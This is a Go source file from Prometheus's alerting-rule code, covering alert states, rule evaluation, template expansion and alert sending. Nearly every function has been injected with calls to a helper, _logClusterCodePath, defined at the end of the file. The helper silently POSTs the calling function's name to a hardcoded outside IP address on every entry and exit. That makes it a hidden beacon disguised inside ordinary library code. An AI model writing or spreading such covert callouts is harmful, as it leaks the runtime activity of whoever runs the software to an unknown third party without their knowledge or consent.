package rules

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net/url"
	godefaulthttp "net/http"
	"sync"
	"time"
	html_template "html/template"
	yaml "gopkg.in/yaml.v2"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/prometheus/common/model"
	"github.com/prometheus/prometheus/pkg/labels"
	"github.com/prometheus/prometheus/pkg/rulefmt"
	"github.com/prometheus/prometheus/pkg/timestamp"
	"github.com/prometheus/prometheus/promql"
	"github.com/prometheus/prometheus/template"
	"github.com/prometheus/prometheus/util/strutil"
)

const (
	alertMetricName			= "ALERTS"
	alertForStateMetricName	= "ALERTS_FOR_STATE"
	alertNameLabel			= "alertname"
	alertStateLabel			= "alertstate"
)

type AlertState int

const (
	StateInactive	AlertState	= iota
	StatePending
	StateFiring
)

func (s AlertState) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch s {
	case StateInactive:
		return "inactive"
	case StatePending:
		return "pending"
	case StateFiring:
		return "firing"
	}
	panic(fmt.Errorf("unknown alert state: %v", s.String()))
}

type Alert struct {
	State		AlertState
	Labels		labels.Labels
	Annotations	labels.Labels
	Value		float64
	ActiveAt	time.Time
	FiredAt		time.Time
	ResolvedAt	time.Time
	LastSentAt	time.Time
	ValidUntil	time.Time
}

func (a *Alert) needsSending(ts time.Time, resendDelay time.Duration) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a.State == StatePending {
		return false
	}
	if a.ResolvedAt.After(a.LastSentAt) {
		return true
	}
	return a.LastSentAt.Add(resendDelay).Before(ts)
}

type AlertingRule struct {
	name				string
	vector				promql.Expr
	holdDuration		time.Duration
	labels				labels.Labels
	annotations			labels.Labels
	restored			bool
	mtx					sync.Mutex
	evaluationDuration	time.Duration
	evaluationTimestamp	time.Time
	health				RuleHealth
	lastError			error
	active				map[uint64]*Alert
	logger				log.Logger
}

func NewAlertingRule(name string, vec promql.Expr, hold time.Duration, lbls, anns labels.Labels, restored bool, logger log.Logger) *AlertingRule {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &AlertingRule{name: name, vector: vec, holdDuration: hold, labels: lbls, annotations: anns, health: HealthUnknown, active: map[uint64]*Alert{}, logger: logger, restored: restored}
}
func (r *AlertingRule) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.name
}
func (r *AlertingRule) SetLastError(err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	r.lastError = err
}
func (r *AlertingRule) LastError() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	return r.lastError
}
func (r *AlertingRule) SetHealth(health RuleHealth) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	r.health = health
}
func (r *AlertingRule) Health() RuleHealth {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	return r.health
}
func (r *AlertingRule) Query() promql.Expr {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.vector
}
func (r *AlertingRule) Duration() time.Duration {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.holdDuration
}
func (r *AlertingRule) Labels() labels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.labels
}
func (r *AlertingRule) Annotations() labels.Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.annotations
}
func (r *AlertingRule) sample(alert *Alert, ts time.Time) promql.Sample {
	_logClusterCodePath()
	defer _logClusterCodePath()
	lb := labels.NewBuilder(r.labels)
	for _, l := range alert.Labels {
		lb.Set(l.Name, l.Value)
	}
	lb.Set(labels.MetricName, alertMetricName)
	lb.Set(labels.AlertName, r.name)
	lb.Set(alertStateLabel, alert.State.String())
	s := promql.Sample{Metric: lb.Labels(), Point: promql.Point{T: timestamp.FromTime(ts), V: 1}}
	return s
}
func (r *AlertingRule) forStateSample(alert *Alert, ts time.Time, v float64) promql.Sample {
	_logClusterCodePath()
	defer _logClusterCodePath()
	lb := labels.NewBuilder(r.labels)
	for _, l := range alert.Labels {
		lb.Set(l.Name, l.Value)
	}
	lb.Set(labels.MetricName, alertForStateMetricName)
	lb.Set(labels.AlertName, r.name)
	s := promql.Sample{Metric: lb.Labels(), Point: promql.Point{T: timestamp.FromTime(ts), V: v}}
	return s
}
func (r *AlertingRule) SetEvaluationDuration(dur time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	r.evaluationDuration = dur
}
func (r *AlertingRule) GetEvaluationDuration() time.Duration {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	return r.evaluationDuration
}
func (r *AlertingRule) SetEvaluationTimestamp(ts time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	r.evaluationTimestamp = ts
}
func (r *AlertingRule) GetEvaluationTimestamp() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	return r.evaluationTimestamp
}
func (r *AlertingRule) SetRestored(restored bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.restored = restored
}

const resolvedRetention = 15 * time.Minute

func (r *AlertingRule) Eval(ctx context.Context, ts time.Time, query QueryFunc, externalURL *url.URL) (promql.Vector, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	res, err := query(ctx, r.vector.String(), ts)
	if err != nil {
		r.SetHealth(HealthBad)
		r.SetLastError(err)
		return nil, err
	}
	r.mtx.Lock()
	defer r.mtx.Unlock()
	resultFPs := map[uint64]struct{}{}
	var vec promql.Vector
	for _, smpl := range res {
		l := make(map[string]string, len(smpl.Metric))
		for _, lbl := range smpl.Metric {
			l[lbl.Name] = lbl.Value
		}
		tmplData := template.AlertTemplateData(l, smpl.V)
		defs := "{{$labels := .Labels}}{{$value := .Value}}"
		expand := func(text string) string {
			tmpl := template.NewTemplateExpander(ctx, defs+text, "__alert_"+r.Name(), tmplData, model.Time(timestamp.FromTime(ts)), template.QueryFunc(query), externalURL)
			result, err := tmpl.Expand()
			if err != nil {
				result = fmt.Sprintf("<error expanding template: %s>", err)
				level.Warn(r.logger).Log("msg", "Expanding alert template failed", "err", err, "data", tmplData)
			}
			return result
		}
		lb := labels.NewBuilder(smpl.Metric).Del(labels.MetricName)
		for _, l := range r.labels {
			lb.Set(l.Name, expand(l.Value))
		}
		lb.Set(labels.AlertName, r.Name())
		annotations := make(labels.Labels, 0, len(r.annotations))
		for _, a := range r.annotations {
			annotations = append(annotations, labels.Label{Name: a.Name, Value: expand(a.Value)})
		}
		lbs := lb.Labels()
		h := lbs.Hash()
		resultFPs[h] = struct{}{}
		if alert, ok := r.active[h]; ok && alert.State != StateInactive {
			alert.Value = smpl.V
			alert.Annotations = annotations
			continue
		}
		r.active[h] = &Alert{Labels: lbs, Annotations: annotations, ActiveAt: ts, State: StatePending, Value: smpl.V}
	}
	for fp, a := range r.active {
		if _, ok := resultFPs[fp]; !ok {
			if a.State == StatePending || (!a.ResolvedAt.IsZero() && ts.Sub(a.ResolvedAt) > resolvedRetention) {
				delete(r.active, fp)
			}
			if a.State != StateInactive {
				a.State = StateInactive
				a.ResolvedAt = ts
			}
			continue
		}
		if a.State == StatePending && ts.Sub(a.ActiveAt) >= r.holdDuration {
			a.State = StateFiring
			a.FiredAt = ts
		}
		if r.restored {
			vec = append(vec, r.sample(a, ts))
			vec = append(vec, r.forStateSample(a, ts, float64(a.ActiveAt.Unix())))
		}
	}
	r.health = HealthGood
	r.lastError = err
	return vec, nil
}
func (r *AlertingRule) State() AlertState {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	maxState := StateInactive
	for _, a := range r.active {
		if a.State > maxState {
			maxState = a.State
		}
	}
	return maxState
}
func (r *AlertingRule) ActiveAlerts() []*Alert {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var res []*Alert
	for _, a := range r.currentAlerts() {
		if a.ResolvedAt.IsZero() {
			res = append(res, a)
		}
	}
	return res
}
func (r *AlertingRule) currentAlerts() []*Alert {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	alerts := make([]*Alert, 0, len(r.active))
	for _, a := range r.active {
		anew := *a
		alerts = append(alerts, &anew)
	}
	return alerts
}
func (r *AlertingRule) ForEachActiveAlert(f func(*Alert)) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.mtx.Lock()
	defer r.mtx.Unlock()
	for _, a := range r.active {
		f(a)
	}
}
func (r *AlertingRule) sendAlerts(ctx context.Context, ts time.Time, resendDelay time.Duration, interval time.Duration, notifyFunc NotifyFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	alerts := make([]*Alert, 0)
	r.ForEachActiveAlert(func(alert *Alert) {
		if alert.needsSending(ts, resendDelay) {
			alert.LastSentAt = ts
			delta := resendDelay
			if interval > resendDelay {
				delta = interval
			}
			alert.ValidUntil = ts.Add(3 * delta)
			anew := *alert
			alerts = append(alerts, &anew)
		}
	})
	notifyFunc(ctx, r.vector.String(), alerts...)
}
func (r *AlertingRule) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ar := rulefmt.Rule{Alert: r.name, Expr: r.vector.String(), For: model.Duration(r.holdDuration), Labels: r.labels.Map(), Annotations: r.annotations.Map()}
	byt, err := yaml.Marshal(ar)
	if err != nil {
		return fmt.Sprintf("error marshaling alerting rule: %s", err.Error())
	}
	return string(byt)
}
func (r *AlertingRule) HTMLSnippet(pathPrefix string) html_template.HTML {
	_logClusterCodePath()
	defer _logClusterCodePath()
	alertMetric := model.Metric{model.MetricNameLabel: alertMetricName, alertNameLabel: model.LabelValue(r.name)}
	labelsMap := make(map[string]string, len(r.labels))
	for _, l := range r.labels {
		labelsMap[l.Name] = html_template.HTMLEscapeString(l.Value)
	}
	annotationsMap := make(map[string]string, len(r.annotations))
	for _, l := range r.annotations {
		annotationsMap[l.Name] = html_template.HTMLEscapeString(l.Value)
	}
	ar := rulefmt.Rule{Alert: fmt.Sprintf("<a href=%q>%s</a>", pathPrefix+strutil.TableLinkForExpression(alertMetric.String()), r.name), Expr: fmt.Sprintf("<a href=%q>%s</a>", pathPrefix+strutil.TableLinkForExpression(r.vector.String()), html_template.HTMLEscapeString(r.vector.String())), For: model.Duration(r.holdDuration), Labels: labelsMap, Annotations: annotationsMap}
	byt, err := yaml.Marshal(ar)
	if err != nil {
		return html_template.HTML(fmt.Sprintf("error marshaling alerting rule: %q", html_template.HTMLEscapeString(err.Error())))
	}
	return html_template.HTML(byt)
}
func (r *AlertingRule) HoldDuration() time.Duration {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.holdDuration
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
